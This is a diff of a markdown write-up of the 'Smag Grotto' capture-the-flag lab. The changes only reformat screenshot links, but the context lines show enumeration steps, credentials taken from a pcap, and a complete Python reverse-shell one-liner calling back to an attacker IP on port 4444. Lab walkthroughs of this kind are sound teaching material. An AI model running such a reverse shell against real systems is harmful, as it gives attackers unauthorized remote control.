@@ -17,16 +17,16 @@ Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds
 ```
 
 Gobuster for enumeration of directories
-![[Screenshots/Pasted image 20251110203623.png]]
+![](Screenshots/Pasted%20image%2020251110203623.png)
 
 
 We access to the page
-![[Screenshots/Pasted image 20251110203748.png]]
+![](Screenshots/Pasted%20image%2020251110203748.png)
 
 
 We download the pcap and observe the domain development.smag.thm and credentials:
 
-![[Screenshots/Pasted image 20251110204022.png]]
+![](Screenshots/Pasted%20image%2020251110204022.png)
 
 Adding the domain to the hosts file
 `echo "<Ip_victim> smag.thm development.smag.thm" | sudo tee -a /etc/hosts`
@@ -47,7 +47,7 @@ Reverse shell:
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.87.146",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
-![[Screenshots/Pasted image 20251110204153.png]]
+![](Screenshots/Pasted%20image%2020251110204153.png)
 
 To kill the connection:
 ```bash
@@ -61,7 +61,7 @@ tcp                        ESTAB                      0                         
         
 ```
 
-![[Screenshots/Pasted image 20251110225714.png]]
+![](Screenshots/Pasted%20image%2020251110225714.png)
 
 
 Prettifying the shell
@@ -86,7 +86,7 @@ cat linpeas.out | grep -i "key"
 ```
 
 
-![[Screenshots/Pasted image 20251110205911.png]]
+![](Screenshots/Pasted%20image%2020251110205911.png)
 
 We prove the permissions that we have in this backups file:
 ```bash
